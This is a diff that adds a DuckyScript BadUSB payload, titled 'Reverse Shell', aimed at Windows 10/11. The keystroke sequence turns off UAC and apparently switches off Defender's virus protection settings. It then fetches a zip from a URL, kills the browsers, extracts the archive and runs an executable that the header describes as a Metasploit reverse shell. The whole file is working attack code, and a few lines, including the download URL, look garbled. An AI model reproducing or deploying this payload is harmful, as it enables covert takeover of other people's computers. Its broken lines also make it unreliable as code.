@@ -1,0 +1,101 @@
+REM Title: Reverse Shell
+REM Description: Executes Metasploit exe reverse shell
+REM Target: Windows 10/11
+REM Version:	1.0
+REM Category:	Exploit
+REM Author: AfterPacket
+REM Source:  https://github.com/AfterPacket/Wifi-Nugget-Payloads
+
+GUI r
+REM Run Attack
+STRING UAC
+ENTER
+DELAY 200
+TAB 
+DELAY 200
+TAB
+ENTER
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+TAB
+DELAY 100
+ENTER
+DELAY 100
+LEFT
+DELAY 100
+ENTER
+DELAY 100
+CONTROL ESCAPE
+GUI r
+DELAY 100
+STRING virus pro
+DELAY 200
+ENTER
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 100
+SPACE
+DELAY 200
+TAB
+DELAY 100
+SPACE
+DELAY 200
+TAB
+DELAY 100
+SPACE
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 100
+SPACE
+GUI r
+STRING  run 
+Enter 
+DELAY 100
+STRING https://www.example.com/Expand-Archive test.zip
+Enter 
+DELAY 200
+GUI r
+REM Run Attack
+String PowerShell
+Enter
+DELAY 100
+String taskkill /F /IM msedge* /T
+Enter
+DELAY 100
+String taskkill /F /IM msedge* /T
+Enter
+DELAY 100
+String taskkill /F /IM firefox* /T
+Enter
+DELAY 100
+String CD Downloads
+Enter
+DELAY 100
+STRING Expand-Archive test.zip
+Enter
+DELAY 100
+String cd test
+ENTER
+DELAY 100
+STRING ./exploitl.exe
+Enter
+String exit
+DELAY 100
+enter
